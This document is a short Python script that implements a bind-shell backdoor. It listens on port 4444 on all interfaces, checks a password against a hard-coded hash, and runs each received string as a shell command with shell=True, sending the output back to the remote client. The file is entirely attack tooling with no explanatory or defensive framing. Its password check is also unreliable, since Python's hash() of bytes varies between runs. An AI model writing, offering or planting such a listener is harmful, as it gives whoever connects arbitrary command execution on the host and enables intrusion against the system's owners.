import socket
import subprocess

LISTEN_IP = ''  # Bind to all interfaces
LISTEN_PORT = 4444
AUTH_HASH = 1634504265594755506  # hash of your password

def wait_for_client(sock):
    print("[+] Listener active on port", LISTEN_PORT)
    sock.settimeout(120)
    sock.listen(1)
    return sock.accept()

def authenticate(conn):
    print("[*] Awaiting authentication...")
    try:
        received = conn.recv(1024)
        if not received or hash(received) != AUTH_HASH:
            print("[-] Authentication failed.")
            return False
        print("[+] Authentication success.")
        return True
    except Exception as error:
        print("[!] Error during auth:", error)
        return False

def command_shell(conn):
    print("[*] Shell session started.")
    while True:
        try:
            cmd = conn.recv(1024).decode()
            if cmd == 'exit':
                break

            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            result = stdout + stderr or b'no stdout'
            conn.send(result)
        except Exception as e:
            print("[!] Command error:", e)
            break

def main():
    listener = socket.socket()
    listener.bind((LISTEN_IP, LISTEN_PORT))

    while True:
        try:
            client, addr = wait_for_client(listener)
            print("[+] Connection from", addr)

            if not authenticate(client):
                client.close()
                continue

            command_shell(client)
            client.close()

        except Exception as e:
            print("[!] Listener error:", e)

    listener.close()
    print("[x] Listener shutdown.")

if __name__ == '__main__':
    main()
